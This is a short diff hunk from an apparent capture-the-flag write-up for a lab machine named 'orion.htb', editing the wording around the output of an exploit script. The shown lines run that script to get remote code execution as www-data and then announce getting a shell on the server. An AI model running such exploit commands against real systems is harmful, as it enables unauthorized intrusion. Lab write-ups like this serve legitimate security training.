@@ -56,9 +56,9 @@ Lets test out the script and try to get remote code execution (RCE):
 
 	./exploit.py -u http://orion.htb/ -c 'id'
 
-As we can see, it returns:
+- Which returns:
 
-	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+		uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Now that we've got RCE, lets get a shell on the server:
 
